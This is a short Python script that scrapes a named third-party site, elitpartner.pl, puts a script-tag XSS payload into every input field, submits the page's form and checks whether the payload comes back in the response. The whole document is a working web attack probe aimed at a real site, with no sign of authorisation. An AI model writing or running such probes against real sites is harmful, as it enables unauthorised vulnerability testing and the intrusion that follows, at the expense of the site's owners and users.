import requests
from bs4 import BeautifulSoup

url = "http://elitpartner.pl"  # Replace with the target URL

response = requests.get(url)
html = response.text

soup = BeautifulSoup(html, "html.parser")

# Find all input fields
input_fields = soup.find_all("input")

# Extract input field details and inject XSS payload
for input_field in input_fields:
    field_type = input_field.get("type")
    field_name = input_field.get("name")
    field_id = input_field.get("id")
    field_value = input_field.get("value", "")

    # Inject XSS payload
    payload = "<script>alert('XSS')</script>"
    input_field['value'] = payload

    # Print details
    print("Input Field:")
    print("Type:", field_type)
    print("Name:", field_name)
    print("ID:", field_id)
    print("Value (Injected):", payload)
    print("---------------------")

# Submit the modified form with injected payload
form = soup.find("form")
if form:
    form_action = form.get("action")
    form_method = form.get("method", "get")

    # Build the payload form data
    payload_data = {}
    for input_field in form.find_all("input"):
        field_name = input_field.get("name")
        field_value = input_field.get("value")
        if field_name:
            payload_data[field_name] = field_value

    # Submit the form with injected payload
    if form_method.lower() == "post":
        response = requests.post(url + form_action, data=payload_data)
    else:
        response = requests.get(url + form_action, params=payload_data)

    # Check if the payload is reflected in the response
    if payload in response.text:
        print("XSS vulnerability detected!")
    else:
        print("Payload not reflected in the response.")
else:
    print("No form found on the page.")